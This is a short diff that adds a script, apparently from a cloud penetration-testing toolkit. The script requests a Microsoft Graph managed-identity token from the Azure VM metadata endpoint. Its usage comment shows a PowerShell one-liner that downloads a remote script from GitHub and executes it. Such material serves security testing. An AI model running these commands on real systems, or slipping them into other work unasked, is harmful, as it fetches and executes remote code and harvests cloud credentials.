@@ -1,0 +1,2 @@
+# Usage - returns a Microsoft Graph Scoped Managed Identity token for a Virtual Machine - IEX(New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/NetSPI/MicroBurst/master/Misc/Shortcuts/VirtualMachineManagedIdentity-management.ps1")
+curl -s 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com/' --header "Metadata: true"
